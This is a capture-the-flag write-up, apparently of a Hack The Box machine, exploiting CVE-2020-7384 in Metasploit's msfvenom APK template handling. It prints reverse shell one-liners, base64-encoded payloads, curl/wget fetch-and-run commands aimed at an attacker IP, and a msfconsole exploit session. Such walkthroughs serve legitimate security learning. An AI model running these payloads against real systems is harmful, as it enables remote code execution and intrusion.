# Metasploit CVE

The CVE exploits a vulnerability in Metasploit 6.0.11. There's no indication of what's running on the box, but this seems to be our best shot.

I found a few articles on the topic that were helpful:
- https://nvd.nist.gov/vuln/detail/CVE-2020-7384
- https://github.com/nomi-sec/PoC-in-GitHub
- https://github.com/nikhil1232/CVE-2020-7384

It seems the exploit is in the Android payload generation, and we need to generate a malicious APK. This article gives a good overview of how it actually works:

https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md#the-vulnerability

It appears to be due to a bad character escape when using `keytool` to generate a self-signed certificate, presumably for allowing the result of the msfvenom command to run as a valid APK. The page describes it better than I can:

![[Pasted image 20210612135954.png]]

## Trying the Exploit Manually

I copied across the exploit with `searchsploit -m multiple/local/49491.py` and renamed it to `gen-apk.py`.

I tried a good number of exploits here. The first thing I had to do was install `jarsigner` so the APK template could be generated:

```bash
$ sudo apt install -y default-jdk
```

The default payload just echoes some text:

```python
# Change me
payload = 'echo "Code execution as $(id)" > /tmp/win'
```

So we can change this to do something more interesting. I first tried a simple `/bin/bash` reverse shell:

```python
payload = 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1'
```

However, trying to generate this immediately crashed, giving me a "keytool error" which seemed to be [because of illegal characters](https://stackoverflow.com/questions/11808391/keytool-error-java-io-ioexceptionincorrect-ava-format).

Instead, I tried a base64 encoded payload:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "bash -c ‘bash -i >& /dev/tcp/10.10.16.211/9001 0>&1’" | base64
YmFzaCAtYyDigJhiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIxMS85MDAxIDA+JjHigJkK
```

So the payload should look like this:

```python
payload = 'echo "YmFzaCAtYyDigJhiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIxMS85MDAxIDA+JjHigJkK" | base64 -d | bash'
```

We can test this works with something harmless:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "id" | base64
aWQK
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "aWQK" | base64 -d | bash
uid=1000(mac) gid=1000(mac) groups=1000(mac),27(sudo)
```

Awesome. Now let's try running it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ python3 gen-apk.py 
[+] Manufacturing evil apkfile
Payload: echo "YmFzaCAtYyDigJhiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIxMS85MDAxIDA+JjHigJkK" | base64 -d | bash
-dname: CN='|echo ZWNobyAiWW1GemFDQXRZeURpZ0poaVlYTm9JQzFwSUQ0bUlDOWtaWFl2ZEdOd0x6RXdMakV3TGpFMkxqSXhNUzg1TURBeElEQStKakhpZ0prSyIgfCBiYXNlNjQgLWQgfCBiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmphrdxir6g/evil.apk
Do: msfvenom -x /tmp/tmphrdxir6g/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

We can submit this template to the generator. Again, the choice of `lhost` doesn't matter:

![[Pasted image 20210612141104.png]]

We click generate, and the page hangs for a while. Eventually, we receive this back to our shell:

![[Pasted image 20210612141148.png]]

Strange, I've never seen that error before. But it means we're on the right track.

I tried to go for a staged payload instead. To achieve this, I'd need two APK files - one to save a reverse shell to the box, and one to execute it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "echo 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1' > /tmp/hellothere.sh" | base64
ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMTEvOTAwMSAwPiYxJyA+IC90bXAv
aGVsbG90aGVyZS5zaAo=
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "/tmp/hellothere.sh" | base64
L3RtcC9oZWxsb3RoZXJlLnNoCg==
```

I had a few issues with this, including base64 encoding occasionally inserting a line break depending on what IP I had. I had to keep checking my payload was okay with `base64 -d` before submitting:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMTEvOTAwMSAwPiYxJyA+IC90bXAvaGVsbG90aGVyZS5zaAo=" | base64 -d
echo 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1' > /tmp/hellothere.sh
```

I also created a second copy of the python script with the second payload, so I could run them both without having to keep going in and editing the `payload` variable.

Submitting the first stage eventually gave me the "something went wrong message":

![[Pasted image 20210612141910.png]]

This isn't really indicative of whether or not it worked. To test, we need to run the second one as well. Resubmitting another payload:

![[Pasted image 20210612142007.png]]

(and remembering to restart our netcat listener):

![[Pasted image 20210612142103.png]]

The page finishes executing, but we don't get a hit. I tried again, this time specifying port 80 in my first stage, and starting a new listener:

![[Pasted image 20210612142418.png]]

But no hit.

### Debugging

I tried a few methods here to try and fix my payload:
- `echo "nc -e /bin/bash 10.10.14.9 9001" | base64` as my payload as an alternative to the `/dev/tcp` shell
- using `/bin/sh` in all the payloads rather than `/bin/bash`
- using a `wget http://10.10.16.211/test` payload to download a reverse shell from my box. This got a hit, proving we did in fact have code execution - but I struggled to think where the downloaded file would end up

I tried a payload that would grab a file with `wget` (as we know this works) and pipe it directly to `bash`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "wget http://10.10.16.211/rev.sh | bash" | base64
d2dldCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ python3 gen-apk.py 
[+] Manufacturing evil apkfile
Payload: echo "d2dldCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK" | base64 -d | bash
-dname: CN='|echo ZWNobyAiZDJkbGRDQm9kSFJ3T2k4dk1UQXVNVEF1TVRZdU1qRXhMM0psZGk1emFDQjhJR0poYzJnSyIgfCBiYXNlNjQgLWQgfCBiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpv43nnb6f/evil.apk
Do: msfvenom -x /tmp/tmpv43nnb6f/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

I made a `rev.sh` file:

```bash
#rev.sh
bash -c 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1'
```

And stood up a python listener on port 80:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then a netcat listener to hopefully catch the shell:

```bash
┌──(mac㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
```

I got a hit on my Python server, but nothing in netcat:

![[Pasted image 20210612143319.png]]

I tried one more time, using `curl` instead of `wget`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "curl http://10.10.16.211/rev.sh | bash" | base64
Y3VybCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ python3 gen-apk.py 
[+] Manufacturing evil apkfile
Payload: echo "Y3VybCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK" | base64 -d | bash
-dname: CN='|echo ZWNobyAiWTNWeWJDQm9kSFJ3T2k4dk1UQXVNVEF1TVRZdU1qRXhMM0psZGk1emFDQjhJR0poYzJnSyIgfCBiYXNlNjQgLWQgfCBiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmp056ul9j3/evil.apk
Do: msfvenom -x /tmp/tmp056ul9j3/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

This time it worked!

![[Pasted image 20210612143650.png]]

### With msfconsole

The first time I did this box, I used msfconsole to generate the apk after not getting it to work manually. It worked first time, and I always wondered what the command was. I'm happy to have been able to successfully debug this the second time around!

Here's what I did with msfconsole either way:

```bash
msf6 > search msfvenom

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection

msf6 > info 0

       Name: Rapid7 Metasploit Framework msfvenom APK Template Command Injection
     Module: exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
   Platform: Unix
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2020-10-29

Provided by:
  Justin Steven

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  FILENAME  msf.apk          yes       The APK file name

Payload information:
  Avoid: 5 characters

Description:
  This module exploits a command injection vulnerability in Metasploit 
  Framework's msfvenom payload generator when using a crafted APK file 
  as an Android payload template. Affects Metasploit Framework <= 
  6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this 
  module is a relatively empty yet valid-enough APK file. To trigger 
  the vulnerability, the victim user should do the following: msfvenom 
  -p android/<...> -x <crafted_file.apk>

References:
  https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md
  https://cvedetails.com/cve/CVE-2020-7384/

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LPORT 9001
LPORT => 9001
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /root/.msf4/local/msf.apk
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exit
```

Then I used the outputted `msf.apk` file to get a shell.